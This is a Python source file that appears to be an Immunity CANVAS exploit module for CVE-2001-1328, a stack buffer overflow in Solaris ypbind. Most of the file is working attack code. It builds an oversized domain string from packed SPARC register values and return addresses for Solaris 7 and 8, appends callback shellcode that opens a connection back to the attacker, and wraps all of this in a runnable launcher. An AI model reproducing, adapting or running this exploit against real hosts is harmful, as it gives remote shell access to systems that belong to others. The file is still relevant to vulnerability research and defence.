#! /usr/bin/env python
"""


"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2003
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import os,getopt
import sys

if "." not in sys.path: sys.path.append(".")

from libs import rpc
from libs.rpc import Packer, Unpacker, UDPClient
from libs import xdr
import socket
import timeoutsocket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import random
import canvasengine

import string
import struct
import random
import select
import libs.addressdb as addressdb

NAME="ypbind YPBINDPROC_DOMAIN Stack Overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="22 June 2001"
DOCUMENTATION["CERT Advisory"]="http://www.auscert.org.au/render.html?it=1915&cid=1978"
DOCUMENTATION["CVE Name"] = "CVE-2001-1328"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1328"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F27488&zone_32=category%3Asecurity%20ypbind"
DOCUMENTATION["Patch Info"]="Solaris 2.6 patch 105403-04, Solaris 7 patch 108750-02, Solaris 8 without patch 110322-01"

DESCRIPTION="ypbind YPBINDPROC_DOMAIN Stack Overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris", "sparc", "_i86pc"] ]

from libs import yp
from yp import YP_Client
from yp import YPException
    
class YPBINDExploit(YP_Client):
    
    def __init__(self, target="", timeout = 5):
        self.tm = timeout
        self.targethost = target
        
    def set_target(self, ip):
        try:
            self.targethost = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise YPException, "YPBINDExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            YP_Client.__init__(self, self.targethost)
        except (socket.error, RuntimeError), self.err:
            raise YPException, str(self.err)
        
    def exploit(self):
        
        timeoutsocket.setDefaultSocketTimeout(5)
        self.ypbind_makesploit()
        self.setup()
        
        self.result = self.ypbindproc_domain(self.domain)
        if self.result == 2:
            self.log("RPC call failed.")
        elif self.result == 1:
            self.log("RPC call succeeded. Exploit most likely failed.")
        else:
            self.log("Unexpected response: %d" % self.result)
        
        time.sleep(2)
        
        if self.ISucceeded():
            self.log("Succeeded!")
            return 1
        
        return 0
        
    def ypbind_makesploit(self):
       
        #shellcode len: 288
        self.domain = ""
        #self.domain = "A"*300 #debug
        self.domain += struct.pack(">L", 0xa41c4011L) * (284/4)
        self.domain += struct.pack(">L", 0xa41c4011L) * 8 #l0 - l7
        self.domain += struct.pack(">L", 0xa41c4011L) #i0
        self.domain += struct.pack(">L", 0xffbef908L) #i1 = safe address
        self.domain += struct.pack(">L", 0xffbef918L) #i2 = safe address
        self.domain += struct.pack(">L", 0xa41c4011L) * 3 #i3, i4, i5
        self.domain += struct.pack(">L", 0xffbef858L) #%fp
        
        print "Version: %d" % self.version
        
        if not self.version:
            self.domain += struct.pack(">L", 0xffbef848L)    #%i7 Solaris 8
        else:
            self.domain += struct.pack(">L", 0xffbef858L)    #%i7 Solaris 7
            
        self.domain += self.shellcode
        self.domain += "\x00"
    
class theexploit(tcpexploit, YPBINDExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x20\x00\\/.:?\r\n%?"
        self.setInfo(DESCRIPTION)
        return

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        self.log("Calling back to %s:%d"%(localhost,localport))
        return self.createSparcShellcode(self.badstring,localhost,localport)    
       
    def neededListenerTypes(self):
            return [canvasengine.SOLARISSPARCMOSDEF]
        
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        try:
            YP_Client.__init__(self, self.host)
        except:
            return 0
        self.log("ypbind is running on the remote end.")
        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        YPBINDExploit.__init__(self, self.host)
        try:
            return self.exploit()
        except YPException, self.expstr:
            self.log(str(self.expstr))
            return 0
    

    def displayVersions(self):
        print "0 : Solaris 8 Ultra (defaulted version)"
        print "1 : Solaris 7 Ultra"
        return
        # 8, 7, 2.6, 2.5.1, 2.5, and 2.4 vulns

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
